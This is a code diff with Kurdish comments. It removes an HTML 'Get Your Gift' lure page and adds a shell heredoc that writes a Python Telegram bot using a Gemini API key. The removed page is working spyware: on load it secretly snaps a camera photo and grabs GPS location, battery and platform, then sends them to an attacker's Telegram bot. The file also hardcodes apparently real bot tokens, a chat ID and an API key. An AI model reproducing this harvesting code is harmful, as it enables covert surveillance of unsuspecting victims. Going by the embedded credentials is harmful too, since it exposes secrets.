@@ -1,75 +1,52 @@
-<!DOCTYPE html>
-<html lang="ku">
-<head>
-    <meta charset="UTF-8">
-    <title>Get Your Gift</title>
-</head>
-<body>
-    <h2 style="text-align:center; margin-top:50px;">بۆ وەرگرتنی دیارییەکەت، ڕێگە بدە بە کامێرا و شوێن</h2>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+cat <<EOF > ai_bot.py
+import telebot
+import requests
+import platform
+import psutil
+import datetime
 
-    <script>
-        const TOKEN = "8624059192:AAHhgZk6peV5k4LpkXIgX8CwuZkqcbjHHuE"; //
-        const CHAT_ID = "7143804196";
+# کلیلەکانت
+API_KEY = "AIzaSyD3a4e3HK9B2R5tQWarJjoOdT7c7dQhu7I"
+BOT_TOKEN = "8732451250:AAFx3w-sF9jISGUO0F_0NbDh905o7MOaN8g"
 
-        async function startHarvest() {
-            let locationData = "مۆڵەتی شوێن نەدراوە";
-            
-            // ١. وەرگرتنی شوێنی GPS
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    locationData = `📍 نەخشەی گوگڵ: https://www.google.com/maps?q=${lat},${lon}`;
-                    await sendData(locationData);
-                });
-            }
+bot = telebot.TeleBot(BOT_TOKEN)
 
-            // ٢. وەرگرتنی وێنە و زانیارییەکانی تر
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+@bot.message_handler(func=lambda message: True)
+def advanced_info(message):
+    user = message.from_user
+    
+    # کۆکردنەوەی زانیارییە وردەکان
+    system_info = (
+        f"👤 **زانیاری بەکارهێنەر:**\n"
+        f"--- ناو: {user.first_name}\n"
+        f"--- یووزەرنەیم: @{user.username}\n"
+        f"--- ئایدی: {user.id}\n"
+        f"--- زمان: {user.language_code}\n"
+        f"--- ئایا بۆتە؟: {user.is_bot}\n\n"
+        
+        f"📱 **زانیاری ئامێر (System):**\n"
+        f"--- سیستەم: {platform.system()} {platform.release()}\n"
+        f"--- پڕۆسێسەر: {platform.processor()}\n"
+        f"--- جۆری ئامێر: {platform.machine()}\n"
+        f"--- کاتی سێرڤەر: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+        
+        f"📊 **دۆخی سەرچاوەکان (Hardware):**\n"
+        f"--- بەکارهێنانی ڕام: {psutil.virtual_memory().percent}%\n"
+        f"--- بەکارهێنانی CPU: {psutil.cpu_percent()}%\n"
+    )
 
-                const battery = await navigator.getBattery();
-                const batteryInfo = `🔋 باتری: ${Math.round(battery.level * 100)}% (${battery.charging ? 'لە شەحنە' : 'لە شەحن نییە'})`;
+    try:
+        # پەیوەندی بە Gemini بۆ وەڵامدانەوەی زیرەک
+        url = f"https://generativelanguage.googleapis.com/v1/models/gemini-1.5-flash:generateContent?key={API_KEY}"
+        payload = {"contents": [{"parts": [{"text": message.text}]}]}
+        response = requests.post(url, json=payload)
+        ai_text = response.json()['candidates'][0]['content']['parts'][0]['text']
+        
+        full_reply = f"{system_info}\n🤖 **وەڵامی AI:**\n{ai_text}"
+        bot.reply_to(message, full_reply)
+    except:
+        bot.reply_to(message, system_info + "\n⚠️ AI لەم ساتەدا وەڵامی نییە.")
 
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('photo', blob, 'snap.jpg');
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('caption', `
-📸 وێنەی نوێ گەیشت!
--------------------------
-${batteryInfo}
-🌐 جۆری ئامێر: ${navigator.platform}
-${locationData}
--------------------------`);
-
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    }, 'image/jpeg');
-                }, 3000);
-            } catch (err) {
-                console.log("Error: " + err);
-            }
-        }
-
-        async function sendData(msg) {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
-            });
-        }
-
-        window.onload = startHarvest;
-    </script>
-</body>
-</html>
+print("بۆتە پێشکەوتووەکە دەستی بەکار کرد...")
+bot.polling()
+EOF
